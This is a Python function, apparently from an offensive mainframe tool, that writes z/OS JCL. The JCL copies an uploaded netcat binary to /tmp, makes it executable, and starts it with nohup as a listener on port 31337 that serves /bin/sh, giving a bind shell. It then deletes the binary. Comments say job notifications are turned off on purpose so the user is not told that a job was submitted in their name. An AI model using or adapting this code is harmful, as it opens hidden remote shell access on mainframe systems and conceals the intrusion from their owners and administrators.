def jcl_creator(jobname, working_dir, mvs_dataset, omvs_binary, shell_port="31337"):
	########################################
	## This section constructs the JCL used to execute the uploaded netcat binary
	#######################################
	# In a JCL file the //* denotes a comment. We've turned off notifications cause we wouldn't
	# want the user to get an annoucement that we submitted a job on their behalf ;)
	# Delete the * infront of NOTIFY= to notify your userID for testing purposes
	# If the job errors out in testing you can figure out why by deleting the * infront of MSGLVL), but there can only be one so add a * to the line imediately after 
	# If you want to see the final JCL use debug mode (-d)
	#######################################
	jcl = "//"
	jcl += jobname
	jcl += ''' JOB 'JCL',
//*         NOTIFY=&SYSUID,
//             CLASS=T,
//             MSGCLASS=H,
//             TIME=NOLIMIT,
//*            MSGLVL=(1,1)
//             MSGLEVEL=(0,0)
//*
//NCLOL EXEC PGM=BPXBATCH
//STDIN DD SYSOUT=*
//STDOUT DD SYSOUT=*
//STDPARM DD *
SH cp -B "//' '''
	jcl = jcl[:-1] #get rid of that trailing space
	jcl += working_dir
	jcl += mvs_dataset
	jcl += "'\" /tmp/"
	jcl += omvs_binary
	jcl += ";\nchmod +x /tmp/"
	jcl += omvs_binary
	jcl += ";\nnohup /tmp/"
	jcl += omvs_binary
	jcl += " -l -p "
	jcl += str(shell_port)
	jcl += " -e /bin/sh;"
	jcl += "\nrm /tmp/"
	jcl += omvs_binary
	jcl += "\n//*"
	return jcl

